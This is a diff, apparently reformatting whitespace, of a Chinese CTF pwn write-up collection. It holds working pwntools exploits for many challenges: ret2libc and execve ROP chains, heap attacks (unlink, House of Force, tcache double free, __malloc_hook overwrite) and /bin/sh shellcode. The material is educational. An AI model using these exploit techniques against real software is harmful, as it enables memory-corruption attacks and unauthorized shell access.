@@ -55,10 +55,10 @@ sl(payload)
 pop_rdi = 0x400c83
 
 def send(payload):
-	ru('!\n')
-	sl('1')
-	ru('ed\n')
-	sl(payload)
+    ru('!\n')
+    sl('1')
+    ru('ed\n')
+    sl(payload)
 
 payload = flat('a'*0x58,pop_rdi,elf.got['__libc_start_main'],elf.plt['puts'],elf.sym['main'])
 send(payload)
@@ -79,8 +79,8 @@ send(payload)
 cat_flag = 0x4006be
 
 def send(payload):
-	ru('number.\n')
-	sl(payload)
+    ru('number.\n')
+    sl(payload)
 
 payload = flat('a'*0x38, cat_flag)
 send(payload)
@@ -157,9 +157,9 @@ ssize_t __cdecl sub_80487D0(char a1)
 
 ```python
 def send1():
-	payload = flat('\x00','a'*6,'\xff')
-	sl(payload)
-	ru('Correct\n')
+    payload = flat('\x00','a'*6,'\xff')
+    sl(payload)
+    ru('Correct\n')
 
 send1()
 main = 0x8048825
@@ -193,7 +193,7 @@ p.sendline(payload)
 
 ```python
 for i in range(4):
-	alloc(0x10) # a0,b1,c2,d3
+    alloc(0x10) # a0,b1,c2,d3
 alloc(0x80) # e4
 free(1) # b
 free(2) # c
@@ -268,20 +268,20 @@ base = u64(dump(2)[:8])-0x3c4b78
 
 ```
 pwndbg> x/32xg (long long)(&main_arena)-0x40
-0x7f16d95deae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
-0x7f16d95deaf0 <_IO_wide_data_0+304>:	0x00007f16d95dd260	0x0000000000000000
-0x7f16d95deb00 <__memalign_hook>:	0x00007f16d929fe20	0x00007f16d929fa00
-0x7f16d95deb10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
+0x7f16d95deae0 <_IO_wide_data_0+288>:    0x0000000000000000    0x0000000000000000
+0x7f16d95deaf0 <_IO_wide_data_0+304>:    0x00007f16d95dd260    0x0000000000000000
+0x7f16d95deb00 <__memalign_hook>:    0x00007f16d929fe20    0x00007f16d929fa00
+0x7f16d95deb10 <__malloc_hook>:    0x0000000000000000    0x0000000000000000
 ```
 
 我们加 13 字节偏移（循环右移），成功伪造 `chunk_size`：
 
 ```
 pwndbg> x/32xg (long long)(&main_arena)-0x40+0xd
-0x7f16d95deaed <_IO_wide_data_0+301>:	0x16d95dd260000000	0x000000000000007f
-0x7f16d95deafd:	0x16d929fe20000000	0x16d929fa0000007f
-0x7f16d95deb0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
-0x7f16d95deb1d:	0x0000000000000000	0x0000000000000000
+0x7f16d95deaed <_IO_wide_data_0+301>:    0x16d95dd260000000    0x000000000000007f
+0x7f16d95deafd:    0x16d929fe20000000    0x16d929fa0000007f
+0x7f16d95deb0d <__realloc_hook+5>:    0x000000000000007f    0x0000000000000000
+0x7f16d95deb1d:    0x0000000000000000    0x0000000000000000
 ```
 
 `0x7f` 对应的 `malloc` 请求大小大约是 `0x60`。现在，freelist 顶部是 `e`，于是 `alloc(0x60)` 就会分配总大小为 `0x71`、起点与 `e` 相同、且索引为 `4` 的 chunk `g`，这时再 `free` 掉 `g` 就会使得 `g` 位于 freelist 顶部。
@@ -312,7 +312,6 @@ fill(6, payload)
 
 最后不要忘记再申请一次任意大小内存以调用 `__malloc_hook`。完整 exp，注意最后一次 alloc 返回得有点慢，`recvuntil` 最好加一个 `timeout`：
 
-
 ```python
 def alloc(size):
     sl('1')
@@ -341,7 +340,7 @@ def dump(idx):
 
 
 for i in range(4):
-	alloc(0x10) # a0,b1,c2,d3
+    alloc(0x10) # a0,b1,c2,d3
 alloc(0x80) # e4
 free(1) # b
 free(2) # c
@@ -383,7 +382,6 @@ fill(6, payload)
 # malloc() -> __malloc_hook()
 alloc(1)
 ```
-
 
 ### get_started_3dsctf_2016
 
@@ -437,7 +435,6 @@ sl(p32(17)*14)
 ### babyfengshui_33c3_2016
 
 本题源码大致如下，开启了 canary 和 NX：
-
 
 ```c
 void __cdecl __noreturn main()
@@ -499,7 +496,6 @@ void __cdecl __noreturn main()
   exit(1);
 }
 ```
-
 
 我们重点关注可能存在漏洞的 `add` 和 `update`，首先是 `add`：
 
@@ -636,7 +632,6 @@ unsigned int __cdecl delete(unsigned __int8 index)
 
 这里就会执行 `free(address of /bin/sh)`，实际上就是 `system('/bin/sh')`。
 
-
 ```python
 def add(max_len, desc_len, text):
     sla('Action:', '0')
@@ -674,7 +669,6 @@ system,binsh = ret2libc(free,'free')
 update(1,4,p32(system))
 delete(2)
 ```
-
 
 ### ciscn_2019_s_3
 
@@ -792,6 +786,7 @@ sla('Exit\n:','4')
 ```
 
 ### [HarekazeCTF2019]baby_rop2
+
 题目给定了 libc，结合题目名可以想到 ret2libc，这里只能调用 `printf` 来打印函数 GOT 地址，其余和常规 ret2libc 相同。
 
 ```python
@@ -807,7 +802,9 @@ sla('name?', payload)
 ```
 
 ### ciscn_2019_n_5
+
 本题没有开启任何保护，因此方法多样，例如 ret2libc：
+
 ```python
 sla('name\n', 'merc')
 pop_rdi = 0x400713
@@ -824,6 +821,7 @@ sla('me?\n', payload)
 ```
 
 或者更简单的 ret2shellcode：
+
 ```python
 sla('name\n', asm(shellcraft.sh()))
 payload = flat('a'*0x28,0x601080)
@@ -834,6 +832,7 @@ sl(payload)
 由于远程 libc 版本和本地二进制文件的版本不同，打远程时推荐使用 ret2shellcode，感觉这个更接近预期解。
 
 ### ciscn_2019_final_3
+
 提供了 libc，发现是 2.27 版本的，考虑和 tcache 利用有关。
 
 程序提供了 `add` 和 `remove` 两个功能，首先 `add` 只能创建小于 0x78 字节的 chunk，且最多创建 0x18 个 chunk。`gift` 会返回分配到的内存地址。而在 `remove` 中，`free` 之后没有将指针置 null，存在 double free。
@@ -841,16 +840,18 @@ sl(payload)
 由于题目给了 libc，我们希望能泄露 libc 地址，这就需要 tcache 中某节点的 fd 指向 libc。而我们知道，unsorted bin 指向 `main_arena` 的指针是指向 libc 的，那么能不能把这个指针给 tcache 中某节点的 fd 呢？
 
 由于 0x78 字节的限制我们无法直接创建适合放入 unsorted bin 中的 chunk，因此需要先合并小堆块，然后修改 `chunk0` 的 `chunk_size` 把他变成一个大堆块。那么如何修改这个 `chunk_size` 字段？这就需要用到 double free，假设我们连续申请堆块申请到了 `chunk11`：
+
 ```python
 chunk0 = add(0x78)
 add(0x18)
 for i in range(10):
-	add(0x78)
+    add(0x78)
 ```
 
 > 注：第二次分配了 0x18 字节是 64 位下最小分配大小。这个 `chunk1` 的分配是为了让 unsorted bin 与 tcache 错位。
 
 那么这时连续两次 `free` 掉 `chunk11`，再 `add` 回来，使得 `chunk11->fd = chunk0-0x10`，那么我们就在 `chunk0-0x10` 处伪造了一个堆块，再次 `add` 就会分配到 `chunk0-0x10`，此时填入准备好的 `prev_size` 及 `chunk_size` 即可修改 `chunk0` 大小。注意为了确保释放后进入 unsorted bin，`chunk_size` 需大于 0x400 字节。
+
 ```python
 remove(11)
 remove(11)
@@ -888,7 +889,9 @@ remove(0)
 ```
 
 ### ciscn_2019_es_2
+
 只能溢出 8 字节，空间太小，因此考虑栈迁移。如下布置栈：
+
 ```
 ret addr
 ebp-0x2c
@@ -903,7 +906,9 @@ ebp-0x24
 padding
 padding
 ```
+
 得到：
+
 ```python
 sa('name?\n','a'*0x28)
 ru('a'*0x28)
@@ -914,7 +919,9 @@ s(payload)
 ```
 
 ### roarctf_2019_easy_pwn
+
 本题在 `write` 时存在 off_by_one 漏洞：
+
 ```c
 __int64 __fastcall sub_E26(signed int a1, unsigned int a2)
 {
@@ -933,10 +940,11 @@ __int64 __fastcall sub_E26(signed int a1, unsigned int a2)
 如果编辑时输入的 `size` 比创建时的 `size` 大 10，就可以多输入一个字节。这多出来的一个字节可以覆盖到下一个 chunk 的 `chunk_size` 字段，从而修改其大小，造成堆块重叠。
 
 首先连续创建 5 个 `chunk`，其中第 0 个的大小必须以 `8` 结尾，否则只能溢出到 `prev_size` 而不是 `chunk_size`。编辑 0 中数据，触发 off_by_one 条件溢出修改 1 的大小。随后 `free(1)` 使其对应大小的 chunk 进入 unsorted bin，此时 2 的 fd 即指向 `main_arena+88`，从而可以泄露 libc。
+
 ```python
 add(0x58) # 0
 for i in range(4):
-	add(0x60) # 1
+    add(0x60) # 1
 edit(0, 0x58+10,'a'*0x58+'\xe1')
 delete(1)
 add(0x60) # 1
@@ -948,6 +956,7 @@ leak('base', base)
 ```
 
 接下来先绕过 fastbin 的大小检查，随后向 fd 写入 `malloc_hook` 上方的地址后申请回来，从申请到的地址出发填充 11 字节后即可用 `one_gadget` 覆盖 `__malloc_hook`。但是需要注意的是 `one_gadget` 的约束条件得不到满足，因此需要先执行 `__libc_realloc` 对 rsp 进行调整。最后用 `one_gadget` 覆盖 `__realloc_hook`。
+
 ```python
 add(0x60) # 5 (2)
 delete(2) # bypass fastbin check
@@ -960,6 +969,7 @@ add(0x18)
 ```
 
 ### ciscn_2019_n_3
+
 本题 `do_new` 函数先创建 `0xc` 的 chunk，包含填充的数字、对数字的打印函数和释放函数；而如果申请的是 `string` 类型，且长度不超过 `0x400` 的话，随后还会创建一个新的 chunk，包含字符串内容、对字符串的打印函数和释放函数。
 
 而在 `do_del` 中，`free` 后没有清空指针，存在 uaf。因此可以先申请两个堆块（总大小大于 `0xc`）然后依次释放，再申请一个大小为 `0xc` 的堆块。那么此时先会拿出 `chunk1` 的 `0xc` 这一块，再拿出 `chunk0` 的 `0xc` 这一块，后者是我们可写的。
@@ -968,15 +978,15 @@ add(0x18)
 
 ```python
 def add(index,len,content='a'):
-	sla('CNote> ','1')
-	sla('Index> ',str(index))
-	sla('Type> ','2')
-	sla('Length> ',str(len))
-	sla('Value> ',content)
+    sla('CNote> ','1')
+    sla('Index> ',str(index))
+    sla('Type> ','2')
+    sla('Length> ',str(len))
+    sla('Value> ',content)
 
 def delete(index):
-	sla('CNote> ','2')
-	sla('Index> ',str(index))
+    sla('CNote> ','2')
+    sla('Index> ',str(index))
 
 add(0,0x10)
 add(1,0x10)
@@ -988,32 +998,33 @@ delete(0)
 ```
 
 ### hitcon2014_stkof
+
 本题共四个功能：添加、读入内容、删除、显示。其中读入内容存在堆溢出，我们可以利用这个溢出实现 unlink 攻击。程序中存在全局数组 `bag`，存放所有 chunk 的 mem 指针。
 
 先申请 3 个 chunk，其中第 1 个 chunk 没有用，只是因为前两个 chunk 不连续所以才申请的。随后通过 chunk2 溢出到 chunk3 进行 unlink 攻击，这样修改 `bag[2]` 等价于修改 `bag[-1]`，填充掉 `bag[-1]` 和 `bag[0]` 后，令：
+
 - `bag[1] = elf.got['free']`
 - `bag[2] = elf.got['fflush']`，`fflush` 可以是任意已调用的 libc 函数
 - `bag[3] = elf.got['atoi']`
 
 此时我们 `edit(1)` 写入 `elf.plt['puts']` 即可劫持 `free` 函数到 `puts`，那么调用 `delete(2)` 就会打印出 `fflush` 地址，从而泄露 libc。最后 `edit(3)` 写入 `system` 地址，劫持 `atoi` 到 `system`，这是因为在程序读入指令时会调用 `atoi(&nptr)`，我们输入的 `nptr` 只需要是 `/bin/sh` 即可 getshell。
 
-
 ```python
 def add(size):
-	sl('1')
-	sl(str(size))
-	ru('OK\n')
+    sl('1')
+    sl(str(size))
+    ru('OK\n')
 
 def delete(index):
-	sl('3')
-	sl(str(index))
+    sl('3')
+    sl(str(index))
 
 def edit(index,content):
-	sl('2')
-	sl(str(index))
-	sl(str(len(content)))
-	s(content)
-	ru('OK\n')
+    sl('2')
+    sl(str(index))
+    sl(str(len(content)))
+    s(content)
+    ru('OK\n')
 
 bag = 0x602140
 
@@ -1043,6 +1054,7 @@ sl('/bin/sh\x00')
 ## Part III
 
 ### sleepyHolder_hitcon_2016
+
 这道题允许保存 small/big/huge secret，其中 huge 只能保存一次，不能删除和修改，并且在保存了一个 small/big 之后就不能再保存新的 small/big 了，只能 renew。
 
 显然这个 huge 就是我们漏洞利用的核心。实际上，huge 的范围属于 large bin，在申请这么大的 chunk 时如果 unsorted bin 中没有满足条件的，就会触发 `malloc_consolidate()`，使 fastbin 中的 chunk 合并进入 unsorted bin，最终根据合并后的大小进入 small bin 或 large bin。那么我们不妨先申请一个 small，然后申请 big 防止 small 被释放时与 top chunk 合并，再释放 small。此时 small 进入 fastbin，再申请 huge 即可让 small 进入到 small bin。
@@ -1076,23 +1088,23 @@ delete(2)
 ```
 
 ### secretHolder_hitcon_2016
+
 类似上一题，不过 huge 可以修改和删除了。由于 huge 非常大，分配时会调用 `mmap()`，但是当释放掉 huge 再申请时，`mmap_threshold` 已经变得和 huge 一样大，此时分配 huge 使用的是 `brk()`，因此 huge 被分配到了堆上。
 
 利用这个特性，我们可以先令 small 和 huge 地址重合，随后在下面垫上 big。在 small 里伪造堆块并释放 big，触发 unlink，剩余的工作就和上一题一模一样了。
 
-
 ```python
 def add(type,content='a'):
-	sla('Renew secret\n','1')
-	sla('Huge secret\n',str(type))
-	sa(': \n',content)
+    sla('Renew secret\n','1')
+    sla('Huge secret\n',str(type))
+    sa(': \n',content)
 def delete(type):
-	sla('Renew secret\n','2')
-	sla('Huge secret\n',str(type))
+    sla('Renew secret\n','2')
+    sla('Huge secret\n',str(type))
 def edit(type,content):
-	sla('Renew secret\n','3')
-	sla('Huge secret',str(type))
-	sa(': \n',content)
+    sla('Renew secret\n','3')
+    sla('Huge secret',str(type))
+    sa(': \n',content)
 
 add(1)
 add(2)
@@ -1125,23 +1137,22 @@ add(2,'/bin/sh\x00')
 delete(2)
 ```
 
-
 ### bcloud_bctf_2016
-在读入名字和读入 Org 以及 Host 时，均存在同样的 `strcpy` 漏洞，前者导致泄露堆地址，而后者允许我们 off-by-one 修改 top chunk 的大小，从而实现 House of Force。通过 gdb 调试得到 `top_chunk = heap + 0xd0`，那么构造的 `evil_size` 就是我们想分配到的 `note_len` 数组地址减去 header 的 0x8，减去 `old_top_chunk` 地址，再减去 12，这是因为已经分配了三个堆块，在程序中每个堆块额外分配了 4B。最后从 `note_len` 覆盖到 `note` 数组，劫持 `free` 到 `printf` 泄露 libc，再劫持 `atoi` 到 `system`。
 
+在读入名字和读入 Org 以及 Host 时，均存在同样的 `strcpy` 漏洞，前者导致泄露堆地址，而后者允许我们 off-by-one 修改 top chunk 的大小，从而实现 House of Force。通过 gdb 调试得到 `top_chunk = heap + 0xd0`，那么构造的 `evil_size` 就是我们想分配到的 `note_len` 数组地址减去 header 的 0x8，减去 `old_top_chunk` 地址，再减去 12，这是因为已经分配了三个堆块，在程序中每个堆块额外分配了 4B。最后从 `note_len` 覆盖到 `note` 数组，劫持 `free` 到 `printf` 泄露 libc，再劫持 `atoi` 到 `system`。
 
 ```python
 def add(len,content='a'):
-	sla('>>\n','1')
-	sla(':\n',str(len))
-	sa(':\n',content)
+    sla('>>\n','1')
+    sla(':\n',str(len))
+    sa(':\n',content)
 def delete(index):
-	sla('>>\n','4')
-	sla(':\n',str(index))
+    sla('>>\n','4')
+    sla(':\n',str(index))
 def edit(index,content):
-	sla('>>\n','3')
-	sla(':\n',str(index))
-	sla(':\n',content)
+    sla('>>\n','3')
+    sla(':\n',str(index))
+    sla(':\n',content)
 
 sa('name:\n','a'*0x40)
 ru('a'*0x40)
@@ -1166,10 +1177,10 @@ edit(2,p32(system))
 sla('>>\n','/bin/sh\x00')
 ```
 
-
-
 ### lctf2016_pwn200
+
 首先不难发现读入 `name` 时存在 off-by-one，可以借此泄露栈地址。为了后面 ret2shellcode，我们可以先在 `name` 里顺便写好 shellcode：
+
 ```python
 payload = asm(shellcraft.sh()).ljust(48,'a')
 sa('u?\n',payload)
@@ -1181,6 +1192,7 @@ leak('rbp',rbp)
 而读入 `money` 时，恰好可以覆盖到堆指针 `dest`。那么可以覆盖 `dest` 为我们伪造的 chunk，同时准备好 `id`（只需要大于 0x10 小于 0x21000 即可）作为 `nextsize`，这样就可以先释放再申请这个 fake chunk，就可以控制 rip 了，最后覆盖 rip 为 shellcode 地址。
 
 通过 gdb 调试，可以绘制大致的栈结构图：
+
 ```
  ------------ <- leaked rbp
 |            | 0x20
@@ -1205,12 +1217,14 @@ leak('rbp',rbp)
 ```
 
 由此可以得到：
+
 ```python
 sc = rbp-0x50
 fake = rbp-0x90
 ```
 
 从而伪造堆块：
+
 ```python
 sla('id ~~?\n',str(0x20))
 sa('money~\n',p64(0)*4+flat(0,0x41,0,fake))
@@ -1224,8 +1238,8 @@ sla('choice :','3')
 ```
 
 ### zctf2016_note2
-添加 note 时，存在整数溢出漏洞，导致添加大小为 0 的 note，可以输入的长度为无符号的 `-1`，可以认为没有限制，但是 `malloc` 依旧会分配 `0x20` 字节。利用这个堆溢出，我们先分配三个 chunk：
 
+添加 note 时，存在整数溢出漏洞，导致添加大小为 0 的 note，可以输入的长度为无符号的 `-1`，可以认为没有限制，但是 `malloc` 依旧会分配 `0x20` 字节。利用这个堆溢出，我们先分配三个 chunk：
 
 ```
 | ...               |               |
@@ -1262,11 +1276,9 @@ sla('choice :','3')
  ------------------- <---------------
 ```
 
-
 我们在 0x80 的 `chunk0` 内伪造了 0x61 的 chunk，并通过 `bp_prev_size=0x60` 确保能通过检查。随后分配大小为 `0` 的 `chunk1`（实际大小为 0x20），由于整数溢出这里可以输入无限长度的内容，最后分配 0x80 的 `chunk2` 用来引起 `unlink`。
 
 接下来释放 1 再拿回来，就可以溢出到 `chunk2`，修改其 `prev_size` 和 `chunk_size`，前者修改为 `0x20+0x80=0xa0`，后者置 `PREV_IN_USE` 位为 `0`。这样再释放 2 就可以 `unlink` 掉我们的 fake chunk 了。此时 `ptr` 指向 `ptr-0x18`，填充 0x18 字节后即可修改 `ptr[0]`，之后就是常规 GOT 劫持了。
-
 
 ```python
 def add(len,content='a'*8):
@@ -1314,9 +1326,10 @@ edit(0,1,p64(system))
 sla('>>','/bin/sh\x00')
 ```
 
-
 ### zctf2016_note3
+
 这题和上题类似，不过 bss 结构大致如下：
+
 ```
 current_ptr
 note0_ptr
@@ -1343,7 +1356,6 @@ note7_size
 
 但是本题的 `show` 功能被禁用，而我们还需要泄露 libc 地址。这里用的方法是在 bss 段空余处写入 `%llx.`，然后把 `free` 先劫持到 `printf`，去打印这一段格式化字符串，相当于手动造了一个格式化字符串漏洞。这样就可以泄露栈上内容，从而泄露位于栈上的 `__libc_start_main_ret` 地址（一般位于偏移量 11 处）。最后泄露 libc 得到 `system` 地址，覆盖 `atoi` 即可。
 
-
 ```python
 def add(len,content='a'*8):
     sla('>>','1')
@@ -1365,7 +1377,7 @@ def delete(index):
 
 negative = 0x8000000000000000
 for i in range(8):
-	add(0x200)
+    add(0x200)
 edit(3,'a')
 fd = 0x6020c8+0x8*3-0x18
 bk = 0x6020c8+0x8*3-0x10
@@ -1389,13 +1401,13 @@ edit(0,p64(system))
 sla('>>','/bin/sh\x00')
 ```
 
-
 ### 0ctf_2018_heapstorm2
+
 分析先咕了，等完全理解了再补充。先放一些参考的 wp：
+
 - [wp1](http://eternalsakura13.com/2018/04/03/heapstorm2/)
 - [wp2](https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/)
 - [wp3](https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md)
-
 
 ```python
 def add(size):
@@ -1465,9 +1477,9 @@ payload = flat(0,0,0,0,0,0x4e1,0,fake+8,0,fake-0x18-5)
 edit(8,payload)
 
 try:
-	add(0x48)
+    add(0x48)
 except:
-	print('Try again?')
+    print('Try again?')
 
 payload = flat(0,0,0,0,0,0x13377331,storage)
 edit(2,payload)
@@ -1491,7 +1503,6 @@ edit(1,p64(system))
 sl('3')
 sla('Index:','2')
 ```
-
 
 ### houseoforange_hitcon_2016
 
@@ -1563,9 +1574,9 @@ system = base + libc.sym['system']
 io_list_all = base + libc.sym['_IO_list_all']
 
 '''large chunk:
-0x56512e53b0c0:	0x0000000000000000 0x0000000000000411
-0x56512e53b0d0:	0x6161616161616161	0x00007f01ea979188
-0x56512e53b0e0:	0x000056512e53b0c0	0x000056512e53b0c0
+0x56512e53b0c0:    0x0000000000000000 0x0000000000000411
+0x56512e53b0d0:    0x6161616161616161    0x00007f01ea979188
+0x56512e53b0e0:    0x000056512e53b0c0    0x000056512e53b0c0
 '''
 edit(0x10,'a'*0x10)
 show()
@@ -1609,8 +1620,8 @@ add(2,0xdeadbeef)
 add(2,0x91) # chunk0
 
 for i in range(7): # fill tcache
-	free(1)
-	add(2,0x20)
+    free(1)
+    add(2,0x20)
 free(1) # unsorted
 show(1)
 ru('number :')
@@ -1651,12 +1662,12 @@ int_80 = 0x80495a3
 data = 0x80d7000
 
 chain86 = [
-	'a'*(0x10c+4),
-	elf.sym['read'],
-	pop_dcb,0,data,0x100,
-	pop_dcb,0,0,data,
-	pop_eax,0xb,
-	int_80
+    'a'*(0x10c+4),
+    elf.sym['read'],
+    pop_dcb,0,data,0x100,
+    pop_dcb,0,0,data,
+    pop_eax,0xb,
+    int_80
 ]
 
 payload = flat(chain86)
@@ -1673,13 +1684,13 @@ syscall = 0x461645
 data = 0x6a4e40
 
 chain64 = [
-	'a'*(0x110+8),
-	pop_rax,0,pop_rdi,0,
-	pop_rsi,data,pop_rdx,0x100,
-	syscall,
-	pop_rax,59,pop_rdi,data,
-	pop_rsi,0,pop_rdx,0,
-	syscall
+    'a'*(0x110+8),
+    pop_rax,0,pop_rdi,0,
+    pop_rsi,data,pop_rdx,0x100,
+    syscall,
+    pop_rax,59,pop_rdi,data,
+    pop_rsi,0,pop_rdx,0,
+    syscall
 ]
 
 payload = flat(chain64)
@@ -1691,7 +1702,6 @@ s('/bin/sh\x00')
 
 这里需要注意的是，栈变量在 32 位下位于 `esp+0xc`，在 64 位下位于 `rsp+0x0`，在计算需要填充的 padding 时需要考虑到这一点。
 
-
 ```python
 pop_eax = 0x80a8af6
 pop_dcb = 0x806e9f1
@@ -1702,12 +1712,12 @@ add_esp_20 = 0x80a69f2
 
 offset86 = 0x20-0xc # esp+0xc
 chain86 = [
-	'a'*offset86,
-	read,
-	pop_dcb,0,data86,0x8,
-	pop_dcb,0,0,data86,
-	pop_eax,0xb,
-	int_80
+    'a'*offset86,
+    read,
+    pop_dcb,0,data86,0x8,
+    pop_dcb,0,0,data86,
+    pop_eax,0xb,
+    int_80
 ]
 payload86 = flat(chain86,word_size=32)
 
@@ -1722,13 +1732,13 @@ add_rsp_80 = 0x40cd17
 offset64 = 0x80-len(payload86) # rsp+0x0
 print hex(offset64)
 chain64 = [
-	'a'*offset64,
-	pop_rax,0,pop_rdi,0,
-	pop_rsi,data64,pop_rdx,0x100,
-	syscall,
-	pop_rax,59,pop_rdi,data64,
-	pop_rsi,0,pop_rdx,0,
-	syscall
+    'a'*offset64,
+    pop_rax,0,pop_rdi,0,
+    pop_rsi,data64,pop_rdx,0x100,
+    syscall,
+    pop_rax,59,pop_rdi,data64,
+    pop_rsi,0,pop_rdx,0,
+    syscall
 ]
 payload64 = flat(chain64,word_size=64)
 
@@ -1738,12 +1748,11 @@ sa('?',payload)
 s('/bin/sh\x00')
 ```
 
-
 ### axb_2019_heap
+
 利用格式化字符串漏洞泄露堆地址和 libc。随后，可以发现 `edit` 时存在 off by one，我们在构造 unlink 的 fake chunk 时，该漏洞会导致修改下一个 chunk 的 `prev_size` 后会覆盖掉它的 `size` 字段最后一个字节。但是同样的，我们也可以利用该漏洞手动恢复最后一个字节。，这里是 `0xa0`。
 
 接下来就常规 unlink，覆盖 `free_hook` 为 `system`，注意维持原 `note` 数组结构。
-
 
 ```python
 sla('name:','%11$p.%15$p')
